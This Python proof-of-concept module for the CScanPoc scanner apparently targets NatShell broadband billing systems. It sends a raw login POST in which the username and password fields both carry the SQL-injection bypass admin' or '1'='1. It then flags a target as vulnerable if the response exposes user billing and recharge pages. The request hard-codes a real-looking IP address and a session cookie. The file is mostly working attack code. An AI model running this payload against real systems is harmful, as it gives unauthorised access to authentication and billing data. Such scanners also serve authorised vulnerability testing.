# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'NatShell_0001'  # 平台漏洞编号，留空
    name = 'NatShell宽带认证计费系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-09-13'  # 漏洞公布时间
    desc = '''
        问题产品地址http://**.**.**.**/renzhengjifeiguanli/
        蓝海网络认证计费管理平台产品存在SQL注入(无需登录DBA权限)。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'NatShell'  # 漏洞应用名称
    product_version = 'NatShell宽带认证计费系统'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a0a1c063-30d7-4ced-bfe0-1e4b796d1d30'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # __Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0140364
            hh = hackhttp.hackhttp()
            payload = ''
            target = self.target + payload
            raw = """
POST /login.php?action=check HTTP/1.1
Host: 222.175.76.90:8888
Content-Length: 440
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://222.175.76.90:8888
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydrjHY65psp3YsROG
Referer: http://222.175.76.90:8888/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh,zh-TW;q=0.8,en;q=0.6,ja;q=0.4,es;q=0.2,fr;q=0.2
Cookie: PHPSESSID=5gq4hkeetfvl2ao3lp9c39u1o7

------WebKitFormBoundarydrjHY65psp3YsROG
Content-Disposition: form-data; name="username"

admin\' or \'1\'=\'1
------WebKitFormBoundarydrjHY65psp3YsROG
Content-Disposition: form-data; name="pwd"

admin\' or \'1\'=\'1
------WebKitFormBoundarydrjHY65psp3YsROG
Content-Disposition: form-data; name="x"

52
------WebKitFormBoundarydrjHY65psp3YsROG
Content-Disposition: form-data; name="y"

7
------WebKitFormBoundarydrjHY65psp3YsROG--"""
            code, head, res, errcode, _ = hh.http(target, raw=raw)
            if code == 200 and "recharge_user.php" in res and 'user_bill.php' in res:
                # security_note(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
